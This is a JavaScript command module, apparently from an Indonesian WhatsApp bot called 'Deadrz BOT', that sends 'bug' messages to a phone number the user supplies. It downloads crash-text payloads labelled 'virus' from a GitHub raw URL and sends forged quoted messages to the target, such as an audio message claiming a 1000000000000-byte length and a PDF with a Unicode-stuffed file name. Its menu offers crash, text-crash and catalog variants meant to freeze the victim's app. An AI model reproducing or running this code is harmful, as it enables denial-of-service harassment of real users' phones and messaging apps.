const { fetchJson } = require("../../utils");
const fs = require("fs");
const join = require("path").join;
const thumb = fs.readFileSync(join(__dirname, 'thumbnail.jpg'))

module.exports = {
	name: "bug",
	alias: ['bug','sendbug'],
	category: "random",
	desc: "BUG",
	async exec({ sock, msg, arg, args }) {
		try{
			if (!arg) return msg.reply(`Contoh Penggunaan : *.bug* <nomor>\n\n*Note :*\nJangan Salah Menggunakan Fitur Ini!`)
			let virus = await await fetchJson("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")
			let virus2 = await await fetchJson("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")
			let type = (args[0] || '').toLowerCase()
			let sections = [{
				title: `Created by Deadrz BOT`,
				rows: [
					{ title: 'Bug PDF', rowId: `.bug pdf ${arg}` },
					{ title: 'Bug VN', rowId: `.bug vn ${arg}` },
					{ title: 'Bug Sticker', rowId: `.bug sticker ${arg}` },
					{ title: 'Bug Image', rowId: `.bug bugimg ${arg}` },
					{ title: 'Bug Video', rowId: `.bug bugvid ${arg}` },
					{ title: 'Bug Crash', rowId: `.bug bugcrash ${arg}` },
					{ title: 'Bug Kontak', rowId: `.bug bugkontak ${arg}` },
					{ title: 'Bug ReactPc', rowId: `.bug reactpc ${arg}` },		
					{ title: 'Bug Catalog', rowId: `.bug bugcatalog ${arg}` },
					{ title: 'Bug TextCrash', rowId: `.bug bugtextcrash ${arg}` },
				]
			}]
			let listMessage = {
				text: '*[ List Bug ]*\n\n*Note :* Jangan Asal Kirim ke orang yg tidak bersalah',
				footer: 'Deadrz BOT',
				buttonText: 'Silahkan Klik Di Sini',
				sections
			}
			
			// BUG VN
			const adehvn = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
			"message": {
				"locationMessage": {}
			}}
			
			// BUG PDF
			const bugpdf = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
			"message": {
				"imageMessage": { "mimetype": "image/jpeg", "caption": 'Hallo Bro', "jpegThumbnail": thumb
				}
			}}
		    const bugimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
			"message": {
				"audioMessage": {
					"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
					"mimetype": "audio/aac",
					"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
					"fileLength": '1000000000000',
					"seconds": '1000000000000',
					"caption": `${virus}`,
					"ptt": false,
					"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
					"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
					"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
					"mediaKeyTimestamp": "1632753911"
					}
				}
			}
			switch (type) {
				case 'vn': {
					await sock.sendMessage(arg.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
				}
				break
				case 'pdf': {
					await sock.sendMessage(arg.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
				}
				break
				case 'bugimg': {
					await sock.sendMessage(arg.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {image: thumb, bugimage }, {quoted: bugimage})
				}
				break
				default:
					await sock.sendMessage(msg.from, listMessage)
				}
			await msg.reply(`Berhasil Mengirim ${type} Di Nomer +${arg}`)
		}catch (e){
			await msg.reply('GAGAL')
		}
	}
}